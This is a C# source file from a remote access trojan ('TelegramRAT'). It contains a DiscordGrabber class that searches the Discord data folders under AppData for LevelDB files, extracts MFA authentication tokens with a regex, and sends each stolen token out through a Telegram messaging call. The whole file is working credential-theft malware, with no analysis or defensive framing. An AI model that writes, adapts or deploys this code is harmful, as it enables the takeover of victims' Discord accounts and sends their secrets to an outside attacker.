```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace TelegramRAT
{
    internal class DiscordGrabber
    {
        // Get token
        public static void Get()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                // Assuming 'telegram' is defined and has a method'sendText'
                telegram.sendText("⛔ Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                // Read the content of the file
                string fileContent = File.ReadAllText(token);
                foreach (Match match in Regex.Matches(fileContent, @"mfa\.[\w-]+"))
                {
                    if (match.Length == 59)
                    {
                        // Assuming 'telegram' is defined and has a method'sendText'
                        telegram.sendText($"💎 Discord token: {match.ToString()}");
                    }
                }
            }
        }

        // Locate *.ldb files
        private static List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string[] paths = {
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            };

            foreach (string path in paths)
            {
                string discordPath = Path.Combine(path, "Discord");
                if (Directory.Exists(discordPath))
                {
                    string[] files = Directory.GetFiles(discordPath, "*.ldb", SearchOption.AllDirectories);
                    ldbFiles.AddRange(files);
                }
            }

            return ldbFiles;
        }
    }
}
